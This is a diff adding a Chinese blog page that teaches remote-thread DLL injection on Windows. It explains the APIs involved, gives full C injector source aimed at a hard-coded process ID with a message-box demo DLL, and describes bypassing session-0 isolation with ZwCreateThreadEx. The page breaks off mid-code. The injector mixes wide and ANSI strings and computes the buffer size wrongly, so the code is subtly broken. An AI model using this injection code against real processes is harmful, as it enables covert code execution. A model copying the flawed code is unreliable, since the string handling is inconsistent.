@@ -1,0 +1,1116 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>技术分享 | DLL注入之远线程注入 - Mr·Yang</title><meta name="Description" content="Mr·Yang"><meta property="og:title" content="技术分享 | DLL注入之远线程注入" />
+<meta property="og:description" content="此文为加密收费内容添加我微信支付后可看:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ybrc.github.io/zh-cn/31-11/" /><meta property="og:image" content="https://ybrc.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-11-30T09:43:54+08:00" />
+<meta property="article:modified_time" content="2022-01-02T18:17:06+08:00" /><meta property="og:site_name" content="Mr·Yang" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://ybrc.github.io/logo.png"/>
+
+<meta name="twitter:title" content="技术分享 | DLL注入之远线程注入"/>
+<meta name="twitter:description" content="此文为加密收费内容添加我微信支付后可看:"/>
+<meta name="application-name" content="Mr·Yang">
+<meta name="apple-mobile-web-app-title" content="Mr·Yang"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="canonical" href="https://ybrc.github.io/zh-cn/31-11/" /><link rel="prev" href="https://ybrc.github.io/zh-cn/31/" /><link rel="next" href="https://ybrc.github.io/zh-cn/31-2/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "技术分享 | DLL注入之远线程注入",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/ybrc.github.io\/zh-cn\/31-11\/"
+        },"genre": "posts","keywords": "DLL注入, 远线程注入","wordcount":  3292 ,
+        "url": "https:\/\/ybrc.github.io\/zh-cn\/31-11\/","datePublished": "2021-11-30T09:43:54+08:00","dateModified": "2022-01-02T18:17:06+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Mr·Yang"},"author": {
+                "@type": "Person",
+                "name": "Mr·Yang"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/zh-cn/" title="Mr·Yang"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/zh-cn/posts/"><i class='fas fa-archive fa-fw'></i> 所有文章 
+                        </a><a class="menu-item" href="/zh-cn/tags/"><i class='fas fa-tags fa-fw'></i> 标签 
+                        </a><a class="menu-item" href="/zh-cn/categories/"><i class='fas fa-th-list fa-fw'></i> 分类 
+                        </a><a class="menu-item" href="/zh-cn/timeline/"><i class='fas fa-user-astronaut fa-fw'></i> 时间线 
+                        </a><a class="menu-item" href="/zh-cn/sources/"><i class='fas fa-door-closed fa-fw'></i> 资源 
+                        </a><a class="menu-item" href="/zh-cn/loveu/" title="表白"><i class='fas fa-heart fa-fw'></i> 表白 
+                        </a><a class="menu-item" href="https://ybrc.github.io" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  
+                        </a>   
+                        <div class="dropdown">
+                            <a href="/zh-cn/about/" class="menu-item menu-more dropbtn" title="关于" ><i class='fas fa-user-secret fa-fw'></i> 关于 
+                            </a>
+                            <div class="menu-more-content dropdown-content"><a href="/zh-cn/books/" title="书籍文献" ><i class='fas fa-charging-station fa-fw'></i> 书籍文献 </a><a href="/zh-cn/talk/" title="在线聊天" ><i class='fas fa-user-secret fa-fw'></i> 在线聊天 </a><a href="/zh-cn/exppoc/" title="渗透测试" ><i class='fas fa-tag fa-fw'></i> ExpPOC </a><a href="/zh-cn/mryang/" title="前方高能♂ 小心外放！" ><i class='fas fa-dizzy fa-fw'></i> 燥起来！  </a></div>
+                        </div>
+                    <span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/zh-cn/31-11/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/zh-cn/" title="Mr·Yang"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/zh-cn/posts/"><i class='fas fa-archive fa-fw'></i> 所有文章 
+                    </a><a class="menu-item" href="/zh-cn/tags/"><i class='fas fa-tags fa-fw'></i> 标签 
+                    </a><a class="menu-item" href="/zh-cn/categories/"><i class='fas fa-th-list fa-fw'></i> 分类 
+                    </a><a class="menu-item" href="/zh-cn/timeline/"><i class='fas fa-user-astronaut fa-fw'></i> 时间线 
+                    </a><a class="menu-item" href="/zh-cn/sources/"><i class='fas fa-door-closed fa-fw'></i> 资源 
+                    </a><a class="menu-item" href="/zh-cn/loveu/" title="表白"><i class='fas fa-heart fa-fw'></i> 表白 
+                    </a><a class="menu-item" href="https://ybrc.github.io" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  
+                    </a>   
+                    <div class="dropdown">
+                        <a href="/zh-cn/about/" class="menu-item menu-more dropbtn" title="关于" ><i class='fas fa-user-secret fa-fw'></i> 关于 
+                        </a>
+                        <div class="menu-more-content dropdown-content"><a href="/zh-cn/books/" title="书籍文献" ><i class='fas fa-charging-station fa-fw'></i> 书籍文献 </a><a href="/zh-cn/talk/" title="在线聊天" ><i class='fas fa-user-secret fa-fw'></i> 在线聊天 </a><a href="/zh-cn/exppoc/" title="渗透测试" ><i class='fas fa-tag fa-fw'></i> ExpPOC </a><a href="/zh-cn/mryang/" title="前方高能♂ 小心外放！" ><i class='fas fa-dizzy fa-fw'></i> 燥起来！  </a></div>
+                    </div>
+                <a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/zh-cn/31-11/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><script>
+			(function(){
+				if( 19870117 ){
+					if (prompt('此文为加密收费内容添加我微信支付索取密码后可看:') !=  19870117 ){
+						alert('密码错误！');
+						if (history.length === 1) {
+							window.opener = null;
+							window.open('', '_self');
+							window.close();
+						} else {
+							history.back();
+						}
+					}
+				}
+			})();
+		</script><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">技术分享 | DLL注入之远线程注入</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/zh-cn/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Mr·Yang</a></span>&nbsp;<span class="post-category">收录于 <a href="/zh-cn/categories/dll%E6%B3%A8%E5%85%A5/"><i class="far fa-folder fa-fw"></i>DLL注入</a>&nbsp;<a href="/zh-cn/categories/%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"><i class="far fa-folder fa-fw"></i>远线程注入</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-11-30">2021-11-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3292 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 7 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="true">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#0x00-远线程注入">0x00 远线程注入</a></li>
+        <li><a href="#0x01-函数介绍">0x01 函数介绍</a>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#openprocess">OpenProcess</a></li>
+                <li><a href="#virtualallocex">VirtualAllocEx</a></li>
+                <li><a href="#writeprocessmemory">WriteProcessMemory</a></li>
+                <li><a href="#createremotethread">CreateRemoteThread</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#0x02-实现过程">0x02 实现过程</a></li>
+        <li><a href="#0x03-实例代码">0x03 实例代码</a></li>
+        <li><a href="#0x04-突破session0隔离的远线程注入">0x04 突破session0隔离的远线程注入</a></li>
+        <li><a href="#0x05-踩坑记录">0x05 踩坑记录</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><strong>此文为加密收费内容添加我微信支付后可看:</strong></p>
+<p><img
+        class="lazyload"
+        data-src="https://tool.lu/netcard/"
+        data-srcset="https://tool.lu/netcard/, https://tool.lu/netcard/ 1.5x, https://tool.lu/netcard/ 2x"
+        data-sizes="auto"
+        alt="https://tool.lu/netcard/"
+        title="IP定位"
+    /></p>
+<h1 id="技术分享--dll注入之远线程注入">技术分享 | DLL注入之远线程注入</h1>
+<h3 id="0x00-远线程注入">0x00 远线程注入</h3>
+<p>远线程注入是指一个进程在另一个进程中创建线程的技术。</p>
+<h3 id="0x01-函数介绍">0x01 函数介绍</h3>
+<h5 id="openprocess">OpenProcess</h5>
+<p><strong>作用：</strong> 打开现有的本地进程对象。</p>
+<p><strong>函数声明：</strong></p>
+<p><img
+        class="lazyload"
+        data-src="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        data-srcset="https://www.heibai.org/zb_system/image/admin/page_copy.png, https://www.heibai.org/zb_system/image/admin/page_copy.png 1.5x, https://www.heibai.org/zb_system/image/admin/page_copy.png 2x"
+        data-sizes="auto"
+        alt="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        title="点击复制代码"
+    /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">HANDLE WINAPI OpenProcess(
+    _In_ DWORD dwDesiredAccess,
+    _In_ BOOL  bInheritHandle,
+    _In_ DWORD dwProcessId
+)
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>参数：</strong>
+dwDesiredAccess：
+想拥有该进程的访问权限，若进程启动了SeDebugPrivilege权限，则无论安全描述符内容是什么，都会授予请求的访问权限。</p>
+<p>bInheritHandle：
+若该值为TRUE，则此进程创建的进程将继承该句柄。</p>
+<p>dwProcessId：
+本地进程的PID。</p>
+<p><strong>返回值：</strong>
+成功：返回进程打开句柄
+失败：返回NULL</p>
+<hr>
+<h5 id="virtualallocex">VirtualAllocEx</h5>
+<p><strong>作用：</strong> 在指定进程的虚拟地址空间内保留、提交或更改内存的状态。</p>
+<p><strong>函数声明：</strong></p>
+<p><img
+        class="lazyload"
+        data-src="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        data-srcset="https://www.heibai.org/zb_system/image/admin/page_copy.png, https://www.heibai.org/zb_system/image/admin/page_copy.png 1.5x, https://www.heibai.org/zb_system/image/admin/page_copy.png 2x"
+        data-sizes="auto"
+        alt="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        title="点击复制代码"
+    /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">LPVOID WINAPI VirtualAllocEx(
+    _In_     HANDLE hProcess,
+    _In_opt_ LPVOID lpAddress,
+    _In_     SIZE_T dwSize,
+    _In_     DWORD  flAllocationType,
+    _In_     DWORD  flProtect
+)
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>参数：</strong>
+hProcess:
+过程的句柄。句柄必须有PROCESS_VM_OPERATION（允许远程VM操作）权限。</p>
+<p>lpAddress：
+指定要分配页面所需起始地址指针。若为NULL，则自动分配内存。</p>
+<p>dwSize：
+要分配的内存大小，单位为字节。</p>
+<p>flAllocationType：
+内存分配类型。具体参数参考官方手册。</p>
+<p>flProtect：
+要分配的页面区域的内存保护。</p>
+<p><strong>返回值：</strong>
+成功：返回分配页面基址
+失败：返回NULL</p>
+<hr>
+<h5 id="writeprocessmemory">WriteProcessMemory</h5>
+<p><strong>作用：</strong> 在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。</p>
+<p><strong>函数声明：</strong></p>
+<p><img
+        class="lazyload"
+        data-src="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        data-srcset="https://www.heibai.org/zb_system/image/admin/page_copy.png, https://www.heibai.org/zb_system/image/admin/page_copy.png 1.5x, https://www.heibai.org/zb_system/image/admin/page_copy.png 2x"
+        data-sizes="auto"
+        alt="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        title="点击复制代码"
+    /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">BOOL WINAPI WriteProcessMemory(
+    _In_  HANDLE  hProcess,
+    _In_  LPVOID  lpBaseAddress,
+    _In_  LPCVOID lpBuffer,
+    _In_  SIZE_T  nSize,
+    _Out_ SIZE_T  *lpNumberOfBytesWritten
+)
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>参数：</strong>
+hProcess:
+要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。</p>
+<p>lpBaseAddress：
+指向指定进程中写入数据的基地址指针。</p>
+<p>lpBuffer：
+指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。</p>
+<p>nSize：
+要写入指定进程的字节数。</p>
+<p>lpNumberOfBytesWritten：
+指向变量的指针，该变量接收传输到指定进程的字节数。</p>
+<p><strong>返回值：</strong>
+成功：返回不为0
+失败：返回0</p>
+<hr>
+<h5 id="createremotethread">CreateRemoteThread</h5>
+<p><strong>作用：</strong> 在另一个进程的虚拟地址空间中创建运行的线程。</p>
+<p><strong>函数声明：</strong></p>
+<p><img
+        class="lazyload"
+        data-src="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        data-srcset="https://www.heibai.org/zb_system/image/admin/page_copy.png, https://www.heibai.org/zb_system/image/admin/page_copy.png 1.5x, https://www.heibai.org/zb_system/image/admin/page_copy.png 2x"
+        data-sizes="auto"
+        alt="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        title="点击复制代码"
+    /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">HANDLE WINAPI CreateRemoteThread（
+    _In_  HANDLE                 hProcess,
+    _In_  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+    _In_  SIZE_T                 dwStackSize,
+    _In_  LPTHREAD_START_ROUTINE lpStartAddress,
+    _In_  LPVOID                 lpParameter,
+    _In_  DWORD                  dwCreationFlags,
+    _Out_ LPDWORD                lpThreadId
+）
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>参数：</strong>
+hProcess:
+要创建线程的进程句柄。句柄必须具有PROCESS_CREATE_THREAD、RPOCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。</p>
+<p>lpThreadAttributes:
+指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定进程是否可以继承返回的句柄。若为NULL，则线程获取默认的安全描述符，不能继承该句柄。</p>
+<p>dwStackSize:
+堆栈的初始大小，以字节为单位。</p>
+<p>lpStartAddress：
+指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。</p>
+<p>lpParameter：
+指向要传递给线程函数的变量的指针。</p>
+<p>dwCreationFlags：
+控制线程创建的标志。若为0，表示线程在创建后立即运行。</p>
+<p>lpThreadId：
+指向接收线程标识符的变量的指针。为NULL则不返回线程标识符。</p>
+<p><strong>返回值：</strong>
+成功：返回新线程的句柄
+失败：返回NULL</p>
+<h3 id="0x02-实现过程">0x02 实现过程</h3>
+<p>1、获取LoadLibrary函数的地址，对于kernel32.dll的加载基址在每个进程中都是相同的，所以我们能获取LoadLibrary函数的地址。
+2、调用VirtualAllocEx函数向目标进程空间申请一块内存。
+3、调用WriteProcessMemory函数将指定的DLL路径写入到目标进程空间。
+4、通过CreateRemoteThread函数加载LoadLibrary函数的地址，进行DLL注入。</p>
+<h3 id="0x03-实例代码">0x03 实例代码</h3>
+<p><img
+        class="lazyload"
+        data-src="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        data-srcset="https://www.heibai.org/zb_system/image/admin/page_copy.png, https://www.heibai.org/zb_system/image/admin/page_copy.png 1.5x, https://www.heibai.org/zb_system/image/admin/page_copy.png 2x"
+        data-sizes="auto"
+        alt="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        title="点击复制代码"
+    /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+
+BOOL CreateRemoteThreadInjectDll(DWORD dwProcessId, wchar_t *pszDllFileName) {
+    HANDLE hProcess = NULL;
+    DWORD dwSize = 0;
+    LPVOID pDllAddr = NULL;
+    FARPROC pFuncProcAddr = NULL;
+
+    // 打开注入的进程
+    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+    if (NULL == hProcess) {
+        printf(&#34;Error OpenProcess,%d&#34;, GetLastError());
+        return FALSE;
+    }
+
+    // 在注入进程中申请内存
+    dwSize = 1 + lstrlen(pszDllFileName);
+    pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
+    if (pDllAddr == NULL) {
+        printf(&#34;Error VirtualAllocEx,%d&#34;, GetLastError());
+        return FALSE;
+    }
+
+    // 向申请的内存中写入数据
+    if (FALSE == WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL)) {
+        printf(&#34;Error WriteProcessMemory,%d&#34;, GetLastError());
+        return FALSE;
+    }
+
+    // 获取LoadLibraryA函数地址
+    pFuncProcAddr = GetProcAddress(GetModuleHandle(L&#34;kernel32.dll&#34;), &#34;LoadLibraryA&#34;);
+    if (NULL == pFuncProcAddr) {
+        printf(&#34;Error GetProcAddress,%d&#34;, GetLastError());
+        return FALSE;
+    }
+
+    // CreateRemoteThreadc创建远程线程，实现dll注入
+    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, NULL);
+    if (NULL == hRemoteThread) {
+        printf(&#34;Error CreateRemoteThread,%d&#34;, GetLastError());
+        return FALSE;
+    }
+
+    CloseHandle(hProcess);
+    return TRUE;
+}
+
+int main() {
+    wchar_t* dllPath = (wchar_t*)&#34;D:\\Dll1.dll&#34;;
+    CreateRemoteThreadInjectDll(9956, dllPath);
+    return 0;
+}
+</code></pre></td></tr></table>
+</div>
+</div><p>DLL代码：
+该DLL项目由vs2019生成，注入后自动弹出消息框</p>
+<p><img
+        class="lazyload"
+        data-src="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        data-srcset="https://www.heibai.org/zb_system/image/admin/page_copy.png, https://www.heibai.org/zb_system/image/admin/page_copy.png 1.5x, https://www.heibai.org/zb_system/image/admin/page_copy.png 2x"
+        data-sizes="auto"
+        alt="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        title="点击复制代码"
+    /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">// dllmain.cpp : 定义 DLL 应用程序的入口点。
+#include &#34;pch.h&#34;
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:{
+        MessageBoxA(NULL, &#34;Inject is OK!&#34;, &#34;OK&#34;, MB_OK);
+        break; 
+    }
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        data-src="https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110808163409448852060.png"
+        data-srcset="https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110808163409448852060.png, https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110808163409448852060.png 1.5x, https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110808163409448852060.png 2x"
+        data-sizes="auto"
+        alt="https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110808163409448852060.png"
+        title="img"
+    /></p>
+<h3 id="0x04-突破session0隔离的远线程注入">0x04 突破session0隔离的远线程注入</h3>
+<p>这里使用到一个函数<strong>ZwCreateThreadEx</strong>，实际上CreateRemoteThread最终是通过调用ZwCreateThreadEx实现远线程创建的，ZwCreateThreadEx更为底层。在内核6.0（Windows VISTA、7、8）之后，由于session隔离机制，在创建进程之后是先挂起进程，检查进程所在的会话层后再决定是否恢复进程。</p>
+<p>在CreateRemoteThread函数调用ZwCreateThreadEx函数时，由于ZwCreateThreadEx第七个参数为1，会导致线程创建后一直处于挂起状态，因此我们需要设置ZwCreateThreadEx第七个参数为0。</p>
+<p>由于在ntdll.dll中，ZwCreateThreadEx并没有被声明，因此需要使用GetProcAddress导出地址</p>
+<p><strong>函数声明：</strong>
+win64下：</p>
+<p><img
+        class="lazyload"
+        data-src="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        data-srcset="https://www.heibai.org/zb_system/image/admin/page_copy.png, https://www.heibai.org/zb_system/image/admin/page_copy.png 1.5x, https://www.heibai.org/zb_system/image/admin/page_copy.png 2x"
+        data-sizes="auto"
+        alt="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        title="点击复制代码"
+    /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">DWORD WINAPI ZwCreateThreadEx(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    LPVOID ObjectAttributes,
+    HANDLE ProcessHandle,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID lpParameter,
+    ULONG CreateThreadFlags,
+    SIZE_T ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    LPVOID pUnkown
+)
+</code></pre></td></tr></table>
+</div>
+</div><p>win32下:</p>
+<p><img
+        class="lazyload"
+        data-src="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        data-srcset="https://www.heibai.org/zb_system/image/admin/page_copy.png, https://www.heibai.org/zb_system/image/admin/page_copy.png 1.5x, https://www.heibai.org/zb_system/image/admin/page_copy.png 2x"
+        data-sizes="auto"
+        alt="https://www.heibai.org/zb_system/image/admin/page_copy.png"
+        title="点击复制代码"
+    /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
